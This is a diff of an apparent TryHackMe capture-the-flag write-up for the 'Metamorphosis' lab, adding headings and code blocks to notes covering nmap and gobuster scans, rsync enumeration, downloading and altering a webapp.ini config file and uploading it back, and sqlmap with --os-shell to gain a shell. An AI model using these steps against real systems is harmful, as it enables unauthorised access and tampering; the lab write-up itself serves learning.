@@ -7,9 +7,14 @@ image: ""
 tags: []
 categories: []
 ---
+## Overview
+
+
+##Inital Recon
 
 First we start with the basic nmap scan 
 
+```bash
 root@kali:~/tryhackme/metamorphosis#nmap -sC -sV  10.10.97.133
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 11:32 IST
 Nmap scan report for 10.10.97.133 (10.10.97.133)
@@ -53,10 +58,11 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds
 
-Now accessing  the web page at port 80 we get default | Apache2 Ubuntu Default Page |
+```
 
+##Gobuster
 
-Now using gobuster 
+```bash
 
 root@kali:~/tryhackme/metamorphosis/conf#gobuster dir -u 10.10.97.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
 ===============================================================
@@ -79,21 +85,35 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /inde.html            (Status: 200) [Size: 10918]                               
 Progress: 56672 / 882244 (6.42%)               
 
-Now going to http://10.10.97.133/admin
+```
 
-We get 403 Forbidden ...
+##Visting Webpage
 
-accessing the source code we get -- make sure admin fuctionality can only be used in development mode --------
+```bash
+http://10.10.97.133/admin
 
-Now we have port 873 running which is Rsync you can read more about this here https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
+```
 
-Now enumerate the rync module using 
+<img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
 
+
+Viewing `source code` 
+
+<img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
+##Rsync Enumeration
+
+We have port 873 running which is `Rsync` you can read more about this here[hacktricks.xyz/pentesting/873-pentesting-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)
+
+```bash
 rsync -rdt rsync://10.10.38.244:873
 
 we get | Conf            All Confs |
 
-now listing content of Conf and dowloading its all file to local machine ..
+```
+Listing content of `Conf`
+
+```bash
 
 rsync -rdt rsync://10.10.38.244:873/Conf
 drwxrwxrwx          4,096 2021/04/11 01:33:08 .
@@ -110,10 +130,17 @@ drwxrwxrwx          4,096 2021/04/11 01:33:08 .
 -rw-r--r--          9,542 2021/04/10 01:30:59 smb.conf
 -rw-rw-r--             72 2021/04/11 01:33:06 webapp.ini
 
-Downloading .......
+```
+Downloading `Conf files` into local machine
+
+```bash
 rsync -av rsync://10.10.38.244:873/Conf ./conf
 
-now reading all the files we have webapp.ini file 
+```
+
+Reading all the files we got webapp.ini file 
+
+```bash
 
 cat webapp.ini 
 [Web_App]
@@ -123,24 +150,31 @@ password = theCat
 
 [Details]
 Local = No
+````
 
+The env variable is set to `prod`  .... change this to `dev` (for development)and uploading back the new webapp.ini file to server.
 
-now the env variable is set to prod .... change this to dev(for development )
-
-and uploading back the new webapp.ini file to server ...
+```bash
 
 rsync -av webapp.ini rsync://10.10.101.93:873/Conf/webapp.ini  
 
-Now accessing the page http://10.10.101.93/admin/
+```
 
-we get 2.png
-
-now accessing this using brupsuite and saving the request to use the sqlmap --------
+Accessing the admin page again  `http://10.10.101.93/admin/`
 
 
+<img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+ 
+Use `brupsuite` and saving the request as `req.txt` file
+
+##SQLmap
+
+use sqlmap `batch mode` so that it doesn't ask for inputs and `os-shell` to get the shell.
+```bash
 sqlmap -r req.txt --level 3 --risk 3 --batch --os-shell
+
+```
 
 
 we get permission denied when try to run these command ..
 and it is confirm the tcp dump was running using linpeas..
-
